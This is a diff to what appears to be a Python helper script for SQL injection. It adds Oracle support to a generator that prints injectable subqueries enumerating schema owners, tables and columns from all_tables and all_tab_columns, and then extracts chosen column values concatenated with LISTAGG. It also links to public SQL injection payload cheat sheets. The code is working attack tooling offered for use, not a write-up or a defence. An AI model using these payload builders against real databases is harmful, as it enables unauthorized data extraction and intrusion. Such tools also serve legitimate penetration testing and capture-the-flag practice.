@@ -91,11 +91,15 @@ if not args.dbs:
     print("Payloads All the Things (find error based payloads):\n\thttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection")
     exit()
 
-# Payloads help
+# Payloads help / Resources
 if args.dbs == 'mysql':
     print("\nPaylods All the Things (mysql): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md\n\n")
 elif args.dbs == 'mssql':
     print("\nPaylods All the Things (mssql): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md\n\n")
+elif args.dbs == 'oracle':
+    print("\nPaylods All the Things (oracle): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md")
+    print("Practice Online - Playground: https://www.oracle.com/database/technologies/olracle-live-sql.html\n\n")
+
 
 
 # databases
@@ -121,6 +125,16 @@ if (not args.database):
         else:
             columns = "name"
             # cmd = "(SELECT DISTINCT name FROM master..sysdatabases)"
+    elif args.dbs == 'oracle':
+        prefix = '(SELECT DISTINCT'
+        suffex = ')'
+        if (args.isSingleRowOutput):
+            columns = "LISTAGG(owner,',')" 
+            source = 'from (select distinct owner from all_tables)'
+        else:
+            columns = "owner"
+            source = 'from all_tables'
+            
     printCmd(prefix, columns, source, suffex)
 
 
@@ -148,6 +162,15 @@ if (args.database and not args.table):
         else:
             columns = "table_name"
             # cmd = f"(SELECT DISTINCT table_name FROM {args.database}.information_schema.tables)"
+    elif args.dbs == 'oracle':
+        prefix = '(SELECT DISTINCT'
+        suffex = ')'
+        if (args.isSingleRowOutput):
+            columns = "LISTAGG(table_name,',')" 
+            source = f"FROM (select distinct table_name from all_tables where owner = '{args.database}')"
+        else:
+            columns = "table_name"
+            source = f"from all_tables where owner = '{args.database}'"
     printCmd(prefix, columns, source, suffex)
     
 
@@ -177,7 +200,15 @@ if (args.database and args.table and not args.columns):
         else:
             columns = "column_name"
             # cmd = f"(SELECT DISTINCT column_name FROM {args.database}.information_schema.columns WHERE table_name = '{args.table}')"
-    
+    elif args.dbs == 'oracle':
+        prefix = '(SELECT DISTINCT'
+        suffex = ')'
+        if (args.isSingleRowOutput):
+            columns = "LISTAGG(column_name,',')" 
+            source = f"FROM (select distinct column_name FROM all_tab_columns WHERE table_name = '{args.table}' and owner = '{args.database}')"
+        else:
+            columns = "column_name"
+            source = f"FROM all_tab_columns WHERE table_name = '{args.table}' and owner = '{args.database}'"
     printCmd(prefix, columns, source, suffex)
     
 
@@ -210,7 +241,16 @@ if (args.database and args.table and args.columns):
         else:
             columns = f'{cmd}'
             # cmd = f"(SELECT STRING_AGG({cmd}, ',') FROM {args.database}..{args.table})"
-    
+    elif args.dbs == 'oracle':
+        cmd = "||':'||".join(columns)
+
+        prefix = '(SELECT DISTINCT'
+        source = f'FROM {args.table}'
+        suffex = ')'
+        if (args.isSingleRowOutput):
+            columns = f"LISTAGG({cmd},',')" 
+        else:
+            columns = f"{cmd}"
     printCmd(prefix, columns, source, suffex)
     
 
